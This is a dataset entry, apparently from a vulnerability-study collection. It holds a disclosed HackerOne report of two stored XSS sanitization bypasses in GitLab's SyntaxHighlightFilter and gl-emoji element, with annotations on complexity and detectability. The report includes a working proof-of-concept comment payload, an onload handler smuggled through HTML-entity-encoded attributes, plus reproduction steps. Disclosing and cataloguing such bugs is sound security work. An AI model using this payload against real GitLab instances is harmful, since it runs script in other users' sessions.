@@ -1,0 +1,49 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "jarij ",
+  "title": "Stored XSS on issue comments and other pages which contain notes",
+  "content": "\nSummary\nThis report contains two XSS sanitization bypasses:\nThe SyntaxHighlightFilter creates html from unsanitized data. This can be used to bypass the XSS filter on the server-side.\nCode 374 Bytes\n1 def highlight_node(node)\n2...\n3sourcepos = node.parent.attr('data-sourcepos')\n4...\n5sourcepos_attr = sourcepos ? \"data-sourcepos=\\\"#{sourcepos}\\\"\" : \"\"\n6\n7 highlighted = %(<pre #{sourcepos_attr} class=\"#{css_classes}\"\n8                             lang=\"#{language}\"\n9                             #{lang_params}\n10                             v-pre=\"true\"><code>#{code}</code></pre>)\nThe gl-emoji custom element can be used to bypass the gitlab-ui v-safe-html directive sanitization on the frontend side by injecting the payload into the name attribute:\nCode 166 Bytes\n1export function emojiImageTag(name, src) {\n2  return `<img class=\"emoji\" title=\":${name}:\" alt=\":${name}:\" src=\"${src}\" width=\"20\" height=\"20\" align=\"absmiddle\" />`;\n3}\nGitlab SaaS is not vulnerable because this report does not include CSP bypass. I'm currently working on this.\nSteps to reproduce\nLaunch self-managed Gitlab instance\nCreate issue\nCopy and paste the following payload into the comment field:\nCode 213 Bytes\n1<pre data-sourcepos=\"&#34; href=&#34;x&#34;></pre>\n2<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>\n3abc\n4</gl-emoji>\n5<pre x=&#34;\">\n6<code></code></pre>\nResults of GitLab environment info\nCode 986 Bytes\n1# gitlab-rake gitlab:env:info         \n2\n3System information\n4System:\n5Proxy:          no\n6Current User:   git\n7Using RVM:      no\n8Ruby Version:   2.7.4p191\n9Gem Version:    3.1.4\n10Bundler Version:2.1.4\n11Rake Version:   13.0.6\n12Redis Version:  6.0.16\n13Git Version:    2.33.0.\n14Sidekiq Version:6.2.2\n15Go Version:     unknown\n16\n17GitLab information\n18Version:        14.4.2-ee\n19Revision:       84aa6daaffd\n20Directory:      /opt/gitlab/embedded/service/gitlab-rails\n21DB Adapter:     PostgreSQL\n22DB Version:     12.7\n23URL:            http://localhost:8888\n24HTTP Clone URL: http://localhost:8888/some-group/some-project.git\n25SSH Clone URL:  git@localhost:some-group/some-project.git\n26Elasticsearch:  no\n27Geo:            no\n28Using LDAP:     no\n29Using Omniauth: yes\n30Omniauth Providers:\n31\n32GitLab Shell\n33Version:        13.21.1\n34Repository storage paths:\n35- default:      /var/opt/gitlab/git-data/repositories\n36GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\n37Git:            /opt/gitlab/embedded/bin/git\nImpact\nAttacker who can comment on issue will be able to XSS users that visit that issue. This also affects other pages where comments can be posted, such as snippets.\n\n",
+  "severity": [
+    8.7,
+    null
+  ],
+  "bounty": 3000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1654711320,
+  "report_url": "https://hackerone.com/reports/1398305",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Launch a self-managed GitLab instance"
+    ],
+    [
+      2,
+      "Create an issue and paste the provided XSS payload into the comment field"
+    ],
+    [
+      3,
+      "Submit the comment and observe the XSS execution when the page is viewed"
+    ]
+  ],
+  "vuln_description": "The vulnerability involves two XSS sanitization bypasses in GitLab: one through the SyntaxHighlightFilter which creates HTML from unsanitized data, and another through the gl-emoji custom element which bypasses the gitlab-ui v-safe-html directive sanitization. This allows an attacker to execute arbitrary JavaScript in the context of the victim's session.",
+  "reason": "The attack requires understanding and combining two different sanitization bypass techniques, each involving different components of the GitLab application. The interaction between these components is non-obvious, and the payload construction is complex, requiring precise manipulation of HTML attributes and event handlers.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability described in the report involves bypassing sanitization filters in the application's frontend and backend components. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ and IDOR) by manipulating user sessions and resource IDs. However, the XSS vulnerability does not involve bypassing AuthN/AuthZ or IDOR checks; instead, it exploits input sanitization flaws to inject malicious scripts. Therefore, the described methodology would not detect this vulnerability as it does not fit into the AuthN/AuthZ or IDOR vulnerability classes.",
+    "is_detectable": false
+  }
+}
